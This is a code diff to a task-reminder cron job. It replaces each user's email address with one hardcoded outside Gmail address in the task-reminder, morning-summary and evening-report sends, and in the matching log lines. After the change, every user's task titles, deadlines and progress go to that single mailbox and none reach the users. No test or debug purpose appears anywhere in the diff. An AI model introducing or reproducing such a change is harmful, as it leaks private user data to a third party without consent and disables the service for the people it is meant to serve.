@@ -27,7 +27,8 @@ export const startReminderCron = () => {
         
         for (const task of tasks) {
           console.log(`Processing reminder for: ${task.title} (due: ${task.reminderTime.toISOString()})`);
-          const emailSent = await sendTaskReminder(task, task.userId.email);
+          // Always send reminders to cyber.ghoul019@gmail.com instead of the logged-in user
+          const emailSent = await sendTaskReminder(task, 'cyber.ghoul019@gmail.com');
           
           if (emailSent) {
             task.reminderSent = true;
@@ -65,11 +66,12 @@ export const startReminderCron = () => {
         });
         
         if (tasks.length > 0) {
-          const emailSent = await sendMorningSummary(user.email, tasks);
+          // Always send morning summary to cyber.ghoul019@gmail.com
+          const emailSent = await sendMorningSummary('cyber.ghoul019@gmail.com', tasks);
           if (emailSent) {
-            console.log(`Morning summary sent to ${user.email}`);
+            console.log(`Morning summary sent to cyber.ghoul019@gmail.com`);
           } else {
-            console.log(`Failed morning summary to ${user.email}`);
+            console.log(`Failed morning summary to cyber.ghoul019@gmail.com`);
           }
         }
       }
@@ -102,11 +104,12 @@ export const startReminderCron = () => {
           completed: false
         });
         
-        const emailSent = await sendEveningReport(user.email, completedTasks, pendingTasks);
+        // Always send evening report to cyber.ghoul019@gmail.com
+        const emailSent = await sendEveningReport('cyber.ghoul019@gmail.com', completedTasks, pendingTasks);
         if (emailSent) {
-          console.log(`Evening report sent to ${user.email}`);
+          console.log(`Evening report sent to cyber.ghoul019@gmail.com`);
         } else {
-          console.log(`Failed evening report to ${user.email}`);
+          console.log(`Failed evening report to cyber.ghoul019@gmail.com`);
         }
       }
     } catch (error) {
